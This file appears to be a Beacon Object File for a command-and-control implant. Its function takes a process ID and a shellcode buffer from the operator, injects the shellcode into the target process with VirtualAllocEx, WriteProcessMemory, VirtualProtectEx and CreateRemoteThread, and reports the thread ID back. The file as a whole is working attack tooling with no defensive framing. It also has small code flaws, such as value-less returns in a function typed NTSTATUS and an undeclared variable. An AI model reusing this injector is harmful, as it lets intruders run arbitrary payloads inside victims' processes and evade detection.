#include <general.h>

struct _SC_DATA {
    PVOID Ptr;
    PBYTE Buff;
    INT32 Size;
};
typedef _SC_DATA SC_DATA;

auto ExplicitInjection(
    _In_ INT32 ProcessId,
    _In_ PBYTE ShellcodeBuff,
    _In_ ULONG ShellcodeSize
) -> NTSTATUS {
    ULONG ErrorCode = ERROR_SUCCESS;

    HANDLE ProcessHandle = OpenProcess( PROCESS_ALL_ACCESS, FALSE, ProcessId );
    if ( ! ProcessHandle ) {
        ErrorCode = GetLastError();
        BeaconPrintf( CALLBACK_ERROR, "Open handle to target process failed with error: (%d) %s", ErrorCode, fmt_error( ErrorCode ) );
        return;
    }

    PVOID ShellcodePtr = VirtualAllocEx( ProcessHandle, nullptr, ShellcodeSize, MEM_COMMIT, PAGE_READWRITE );
    if ( ! ShellcodePtr ) {
        ErrorCode = GetLastError();
        BeaconPrintf( CALLBACK_ERROR, "Allocation memory to shellcode failed with error: (%d) %s", ErrorCode, fmt_error( ErrorCode ) );
        return;
    }

    SIZE_T BytesWritten = 0;
    if ( ! WriteProcessMemory( ProcessHandle, ShellcodePtr, ShellcodeBuff, ShellcodeSize, &BytesWritten ) ) {
        ErrorCode = GetLastError();
        BeaconPrintf( CALLBACK_ERROR, "Write shellcode failed with error: (%d) %s", ErrorCode, fmt_error( ErrorCode ) );
        return;
    }

    ULONG OldProtection = 0;
    if ( ! VirtualProtectEx( ProcessHandle, ShellcodePtr, ShellcodeSize, PAGE_EXECUTE_READ, &OldProtection ) ) {
        ErrorCode = GetLastError();
        BeaconPrintf( CALLBACK_ERROR, "Change protection to RX failed with error: (%d) %s", ErrorCode, fmt_error( ErrorCode ) );
        return;
    }

    ULONG ThreadId = 0;
    if ( ! CreateRemoteThread( ProcessHandle, nullptr, 0, (LPTHREAD_START_ROUTINE)ShellcodePtr, nullptr, 0, &ThreadId ) ) {
        ErrorCode = GetLastError();
        BeaconPrintf( CALLBACK_ERROR, "Create thread to execute shellcode failed with error: (%d) %s", ErrorCode, fmt_error( ErrorCode ) );
        return;
    }

    BeaconPrintf( CALLBACK_OUTPUT, "Executing Shellcode in Thread ID: %d\n", ThreadId );
}

#if !defined(USE_GO_ENTRY)
extern "C" auto go( char* args, int argc ) -> void {
    datap   DataPsr   = { 0 };
    SC_DATA Shellcode = { 0 };
    data_psr = &DataPsr;

    BeaconDataParse( &DataPsr, args, argc );

    ULONG ProcessId = BeaconDataInt( &DataPsr );

    INT32 ShellcodeSize = 0;
    PBYTE ShellcodeBuff = (PBYTE)BeaconDataExtract( &DataPsr, &ShellcodeSize );

    ExplicitInjection( ProcessId, ShellcodeBuff, ShellcodeSize );
}
#endif